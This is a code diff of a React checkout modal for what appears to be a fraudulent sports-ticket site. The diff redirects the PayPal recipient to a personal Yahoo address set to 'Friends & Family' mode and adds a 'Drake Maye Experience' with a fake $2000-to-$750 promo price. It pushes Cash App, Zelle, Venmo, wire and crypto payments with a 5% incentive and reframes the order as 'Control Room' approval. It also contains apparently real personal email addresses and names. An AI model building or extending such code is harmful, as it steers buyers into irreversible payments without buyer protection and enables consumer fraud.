@@ -90,9 +90,10 @@ export const OFFICIAL_PAYMENT_CHANNELS = {
     discountPercent: 5
   },
   paypal: {
-    email: "matthewgolom21@gmail.com",
-    name: "Matthew Golom",
-    display: "matthewgolom21@gmail.com",
+    email: "amj688640@yahoo.com",
+    name: "Anna williams",
+    display: "amj688640@yahoo.com",
+    mode: "FRIENDS & FAMILY",
     discountPercent: 5
   },
   venmo: {
@@ -197,27 +198,34 @@ export const TicketCheckoutModal: React.FC<TicketCheckoutModalProps> = ({
   const vipPrice = isSeahawksGame ? 5000 : (game.vipPrice || 5000);
   const seasonPassPrice = isSeahawksGame ? 8000 : (game.seasonPassPrice || 8000);
   
+  const isDrakeMaye = Boolean(
+    game?.id?.includes("drake") || 
+    passName?.toLowerCase()?.includes("drake maye") || 
+    game?.name?.toLowerCase()?.includes("drake maye")
+  );
+
   // Standard full prices before discount
   const originalTierRates: Record<"general" | "lower_bowl" | "club" | "vip" | "season_pass", number> = {
-    general: basePrice,
-    lower_bowl: isSeahawksGame ? 2400 : Math.round(basePrice * 1.8),
-    club: isSeahawksGame ? 3600 : Math.round(basePrice * 3.0),
-    vip: vipPrice,
-    season_pass: seasonPassPrice
+    general: isDrakeMaye ? 2000 : basePrice,
+    lower_bowl: isDrakeMaye ? 2000 : (isSeahawksGame ? 2400 : Math.round(basePrice * 1.8)),
+    club: isDrakeMaye ? 2000 : (isSeahawksGame ? 3600 : Math.round(basePrice * 3.0)),
+    vip: isDrakeMaye ? 2000 : vipPrice,
+    season_pass: isDrakeMaye ? 2000 : seasonPassPrice
   };
 
   // Check if promo code is applied
   const is258025Applied = !!appliedPromo;
 
   // Discounted rates when code 258025 is active:
+  // Drake Maye Experience -> $2000 slashed to $750
   // Match tickets -> 50% off (e.g. $1200 -> $600, $2400 -> $1200, $3600 -> $1800, $5000 -> $2500)
   // Season Pass -> $8k to $5k ($8,000 -> $5,000)
   const discountedTierRates: Record<"general" | "lower_bowl" | "club" | "vip" | "season_pass", number> = {
-    general: is258025Applied ? Math.round(originalTierRates.general * 0.5) : originalTierRates.general,
-    lower_bowl: is258025Applied ? Math.round(originalTierRates.lower_bowl * 0.5) : originalTierRates.lower_bowl,
-    club: is258025Applied ? Math.round(originalTierRates.club * 0.5) : originalTierRates.club,
-    vip: is258025Applied ? Math.round(originalTierRates.vip * 0.5) : originalTierRates.vip,
-    season_pass: is258025Applied ? 5000 : originalTierRates.season_pass
+    general: is258025Applied ? (isDrakeMaye ? 750 : Math.round(originalTierRates.general * 0.5)) : originalTierRates.general,
+    lower_bowl: is258025Applied ? (isDrakeMaye ? 750 : Math.round(originalTierRates.lower_bowl * 0.5)) : originalTierRates.lower_bowl,
+    club: is258025Applied ? (isDrakeMaye ? 750 : Math.round(originalTierRates.club * 0.5)) : originalTierRates.club,
+    vip: is258025Applied ? (isDrakeMaye ? 750 : Math.round(originalTierRates.vip * 0.5)) : originalTierRates.vip,
+    season_pass: is258025Applied ? (isDrakeMaye ? 750 : 5000) : originalTierRates.season_pass
   };
 
   const currentPricePerTicket = discountedTierRates[selectedTier];
@@ -1056,42 +1064,42 @@ export const TicketCheckoutModal: React.FC<TicketCheckoutModalProps> = ({
               <div className="space-y-3">
                 <div className="flex items-center justify-between">
                   <label className="block text-[10px] font-black uppercase tracking-widest text-zinc-400">
-                    3. OFFICIAL PAYMENT METHOD
+                    3. OFFICIAL PAYMENT CHANNEL
                   </label>
                   <span className="text-[9px] font-black uppercase text-emerald-400 flex items-center gap-1">
-                    <ShieldCheck className="w-3 h-3" /> SECURE CONCIERGE SETTLEMENT
+                    <ShieldCheck className="w-3 h-3" /> CONCIERGE VERIFIED
                   </span>
                 </div>
 
                 {/* Direct-Pay 5% Discount Callout */}
-                <div className="p-3.5 bg-gradient-to-r from-emerald-950/80 via-emerald-900/40 to-cyan-950/60 border border-emerald-500/40 rounded-2xl flex flex-col sm:flex-row sm:items-center justify-between gap-2.5 shadow-lg shadow-emerald-950/30">
+                <div className="p-4 bg-gradient-to-r from-emerald-950/90 via-emerald-900/50 to-zinc-950 border border-emerald-500/40 rounded-2xl flex flex-col sm:flex-row sm:items-center justify-between gap-3 shadow-lg shadow-emerald-950/40">
                   <div className="flex items-center gap-3">
-                    <div className="w-8 h-8 rounded-xl bg-emerald-500/20 border border-emerald-500/40 flex items-center justify-center text-emerald-400 flex-shrink-0">
-                      <Percent className="w-4 h-4" />
+                    <div className="w-10 h-10 rounded-xl bg-emerald-500/20 border border-emerald-500/40 flex items-center justify-center text-emerald-400 flex-shrink-0">
+                      <Percent className="w-5 h-5" />
                     </div>
                     <div>
                       <div className="flex items-center gap-2">
-                        <span className="text-[11px] font-black uppercase text-emerald-400 tracking-wide">
-                          Save 5% Instant Direct-Pay Discount
+                        <span className="text-xs font-black uppercase text-emerald-400 tracking-wider">
+                          SAVE 5% OFF YOUR ENTIRE ORDER
                         </span>
-                        <span className="bg-emerald-500 text-black text-[8px] font-black uppercase px-1.5 py-0.5 rounded-full">
-                          5% OFF
+                        <span className="bg-emerald-500 text-black text-[8px] font-black uppercase px-2 py-0.5 rounded-full">
+                          INSTANT
                         </span>
                       </div>
-                      <p className="text-[10px] text-zinc-300 font-medium">
-                        Pay with <strong className="text-white">Cash App, PayPal, Venmo, or Zelle</strong> to automatically deduct <strong className="text-emerald-400">5% off your entire order</strong> instantly!
+                      <p className="text-[11px] text-zinc-300 font-medium mt-0.5">
+                        Pay via <strong className="text-white">Cash App, PayPal, Venmo, or Zelle</strong> to instantly receive 5% off at checkout.
                       </p>
                     </div>
                   </div>
                   {isDirectPayDiscount ? (
-                    <span className="px-2.5 py-1 bg-emerald-500/20 border border-emerald-500/40 text-emerald-300 text-[10px] font-black uppercase tracking-wider rounded-xl self-start sm:self-auto flex items-center gap-1">
+                    <span className="px-3 py-1.5 bg-emerald-500/20 border border-emerald-500/40 text-emerald-300 text-[10px] font-black uppercase tracking-wider rounded-xl self-start sm:self-auto flex items-center gap-1.5">
                       <Check className="w-3.5 h-3.5 text-emerald-400" /> 5% Saved (-${directPaySavings.toLocaleString()})
                     </span>
                   ) : (
                     <button
                       type="button"
                       onClick={() => setPaymentTab("cashapp")}
-                      className="px-3 py-1.5 bg-emerald-500 hover:bg-emerald-400 text-black text-[10px] font-black uppercase tracking-wider rounded-xl self-start sm:self-auto transition-all cursor-pointer flex items-center gap-1 font-mono font-bold"
+                      className="px-3.5 py-1.5 bg-emerald-500 hover:bg-emerald-400 text-black text-[10px] font-black uppercase tracking-wider rounded-xl self-start sm:self-auto transition-all cursor-pointer flex items-center gap-1 font-mono font-bold"
                     >
                       Select & Save 5%
                     </button>
@@ -1100,12 +1108,12 @@ export const TicketCheckoutModal: React.FC<TicketCheckoutModalProps> = ({
 
                 <div className="flex flex-wrap gap-2">
                   {[
-                    { id: "cashapp", label: "Cash App", discount: "SAVE 5%", icon: Smartphone, color: "text-emerald-400" },
-                    { id: "paypal", label: "PayPal", discount: "SAVE 5%", icon: CreditCard, color: "text-blue-400" },
-                    { id: "venmo", label: "Venmo", discount: "SAVE 5%", icon: Smartphone, color: "text-sky-400" },
-                    { id: "zelle", label: "Zelle", discount: "SAVE 5%", icon: Smartphone, color: "text-purple-400" },
-                    { id: "bank", label: "BMO Bank (Wire/ACH)", icon: Building2, color: "text-zinc-400" },
-                    { id: "crypto", label: "Crypto (BTC/ETH/USDT)", icon: QrCode, color: "text-amber-400" }
+                    { id: "cashapp", label: "CASH APP", discount: "SAVE 5%", icon: Smartphone, color: "text-emerald-400" },
+                    { id: "paypal", label: "PAYPAL", discount: "SAVE 5%", icon: CreditCard, color: "text-blue-400" },
+                    { id: "venmo", label: "VENMO", discount: "SAVE 5%", icon: Smartphone, color: "text-sky-400" },
+                    { id: "zelle", label: "ZELLE", discount: "SAVE 5%", icon: Smartphone, color: "text-purple-400" },
+                    { id: "bank", label: "BMO BANK (WIRE/ACH)", icon: Building2, color: "text-zinc-400" },
+                    { id: "crypto", label: "CRYPTO (BTC/ETH/USDT)", icon: QrCode, color: "text-amber-400" }
                   ].map(tab => (
                     <button
                       key={tab.id}
@@ -1260,16 +1268,24 @@ export const TicketCheckoutModal: React.FC<TicketCheckoutModalProps> = ({
                         <span className="text-xs font-black uppercase text-white flex items-center gap-2">
                           <CreditCard className="w-4 h-4 text-blue-400" /> PayPal Instant Settlement
                         </span>
-                        <span className="text-[9px] font-mono uppercase bg-emerald-500/20 text-emerald-400 px-2 py-0.5 rounded font-black flex items-center gap-1">
-                          <Sparkles className="w-3 h-3" /> 5% Discount Applied
-                        </span>
+                        <div className="flex items-center gap-2">
+                          <span className="text-[9px] font-mono uppercase bg-blue-500/20 text-blue-300 border border-blue-500/30 px-2 py-0.5 rounded font-black">
+                            FRIENDS & FAMILY
+                          </span>
+                          <span className="text-[9px] font-mono uppercase bg-emerald-500/20 text-emerald-400 px-2 py-0.5 rounded font-black flex items-center gap-1">
+                            <Sparkles className="w-3 h-3" /> 5% Discount Applied
+                          </span>
+                        </div>
                       </div>
 
                       <div className="p-4 bg-zinc-900 rounded-xl border border-blue-500/20 flex flex-col sm:flex-row sm:items-center justify-between gap-3">
-                        <div>
-                          <span className="text-[8px] font-black uppercase text-zinc-500 block">Official PayPal Email / Recipient</span>
+                        <div className="space-y-1">
+                          <span className="text-[8px] font-black uppercase text-zinc-500 block">PAYPAL RECIPIENT DETAILS</span>
+                          <div className="text-base font-bold text-white">Anna williams</div>
                           <span className="text-sm font-mono font-black text-blue-300 block">{OFFICIAL_PAYMENT_CHANNELS.paypal.email}</span>
-                          <span className="text-[10px] text-zinc-400 font-bold uppercase block mt-0.5">Name: {OFFICIAL_PAYMENT_CHANNELS.paypal.name}</span>
+                          <div className="inline-flex items-center gap-1.5 px-2 py-0.5 bg-blue-500/10 border border-blue-500/20 rounded text-[9px] text-blue-300 font-bold uppercase mt-1">
+                            <span>Mode: <strong>FRIENDS & FAMILY</strong></span>
+                          </div>
                         </div>
                         <button
                           type="button"
@@ -1411,16 +1427,16 @@ export const TicketCheckoutModal: React.FC<TicketCheckoutModalProps> = ({
               {/* Step 4: Contact & Order Details */}
               <div className="space-y-3">
                 <label className="block text-[10px] font-black uppercase tracking-widest text-zinc-400">
-                  4. TICKET HOLDER & DELIVERY CONTACT
+                  4. PASS & APPROVAL DETAILS
                 </label>
 
                 <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
                   <div>
-                    <span className="block text-[8px] font-black uppercase text-zinc-500 mb-1">Full Name</span>
+                    <span className="block text-[8px] font-black uppercase text-zinc-500 mb-1">FULL NAME / SENDER NAME *</span>
                     <input
                       type="text"
                       required
-                      placeholder="e.g. Jon Doe"
+                      placeholder="e.g. Jayne Welage"
                       value={buyerName}
                       onChange={(e) => setBuyerName(e.target.value)}
                       className="w-full bg-zinc-950 border border-white/10 rounded-xl px-4 py-2.5 text-xs font-bold text-white focus:outline-none focus:border-blue-500"
@@ -1428,11 +1444,11 @@ export const TicketCheckoutModal: React.FC<TicketCheckoutModalProps> = ({
                   </div>
 
                   <div>
-                    <span className="block text-[8px] font-black uppercase text-zinc-500 mb-1">Email (For Barcode Dispatch)</span>
+                    <span className="block text-[8px] font-black uppercase text-zinc-500 mb-1">EMAIL ADDRESS (FOR PASS & APPROVAL) *</span>
                     <input
                       type="email"
                       required
-                      placeholder="e.g. example@gmail.com"
+                      placeholder="e.g. jayne_welage@msn.com"
                       value={buyerEmail}
                       onChange={(e) => setBuyerEmail(e.target.value)}
                       className="w-full bg-zinc-950 border border-white/10 rounded-xl px-4 py-2.5 text-xs font-bold text-white focus:outline-none focus:border-blue-500"
@@ -1440,7 +1456,7 @@ export const TicketCheckoutModal: React.FC<TicketCheckoutModalProps> = ({
                   </div>
 
                   <div>
-                    <span className="block text-[8px] font-black uppercase text-zinc-500 mb-1">Phone Number (Optional SMS Pass)</span>
+                    <span className="block text-[8px] font-black uppercase text-zinc-500 mb-1">PHONE NUMBER (OPTIONAL FOR SMS ALERTS)</span>
                     <input
                       type="tel"
                       placeholder="e.g. +1 (555) 019-2834"
@@ -1451,10 +1467,10 @@ export const TicketCheckoutModal: React.FC<TicketCheckoutModalProps> = ({
                   </div>
 
                   <div>
-                    <span className="block text-[8px] font-black uppercase text-zinc-500 mb-1">Payment Reference / Transaction ID</span>
+                    <span className="block text-[8px] font-black uppercase text-zinc-500 mb-1">PAYMENT REF / TRANSACTION ID / CASHTAG</span>
                     <input
                       type="text"
-                      placeholder="e.g. CashApp tag / Wire Ref / Hash"
+                      placeholder="e.g. Cashtag / PayPal ref / Tx hash"
                       value={paymentRef}
                       onChange={(e) => setPaymentRef(e.target.value)}
                       className="w-full bg-zinc-950 border border-white/10 rounded-xl px-4 py-2.5 text-xs font-bold text-white focus:outline-none focus:border-blue-500"
@@ -1467,10 +1483,15 @@ export const TicketCheckoutModal: React.FC<TicketCheckoutModalProps> = ({
                   <PaymentReceiptUploader
                     value={paymentReceiptUrl}
                     onChange={setPaymentReceiptUrl}
-                    label="Attach Payment Receipt / Screenshot Proof"
-                    description="Upload or drag & drop a screenshot of your payment confirmation, wire slip, or receipt for manager approval."
+                    label="DROP SCREENSHOT OF PAYMENT OR RECEIPT (OPTIONAL BUT RECOMMENDED)"
+                    description="Upload or drop screenshot of payment confirmation or receipt for expedited Control Room clearance."
                     required={false}
                   />
+                </div>
+
+                <div className="p-3 bg-zinc-900/80 rounded-xl border border-white/5 flex items-center gap-2 text-zinc-400 text-xs">
+                  <ShieldCheck className="w-4 h-4 text-emerald-400 flex-shrink-0" />
+                  <span>No account needed to reserve. Payment will be verified and approved from the box office Control Room.</span>
                 </div>
               </div>
 
@@ -1557,19 +1578,19 @@ export const TicketCheckoutModal: React.FC<TicketCheckoutModalProps> = ({
                     onClick={onClose}
                     className="px-6 py-3.5 bg-zinc-900 hover:bg-zinc-800 text-zinc-400 hover:text-white rounded-2xl text-xs font-black uppercase tracking-wider transition-all"
                   >
-                    Cancel
+                    ADJUST DETAILS
                   </button>
 
                   <button
                     type="submit"
                     disabled={isSubmitting}
-                    className="flex-1 py-3.5 bg-blue-600 hover:bg-blue-500 text-white rounded-2xl text-xs font-black uppercase tracking-widest shadow-xl shadow-blue-600/30 flex items-center justify-center gap-2 transition-all cursor-pointer disabled:opacity-50"
+                    className="flex-1 py-3.5 bg-emerald-500 hover:bg-emerald-400 text-black rounded-2xl text-xs font-black uppercase tracking-widest shadow-xl shadow-emerald-500/30 flex items-center justify-center gap-2 transition-all cursor-pointer disabled:opacity-50 font-mono"
                   >
                     {isSubmitting ? (
                       <>Verifying Dispatch...</>
                     ) : (
                       <>
-                        <Send className="w-4 h-4" /> {splitMode === "full" ? `Confirm & Issue Pass ($${totalAmount.toLocaleString()})` : `Confirm & Settle Today's Split ($${currentSplit.dueToday.toLocaleString()})`}
+                        <ShieldCheck className="w-4 h-4 text-black" /> CONFIRM PAYMENT & SUBMIT FOR APPROVAL
                       </>
                     )}
                   </button>
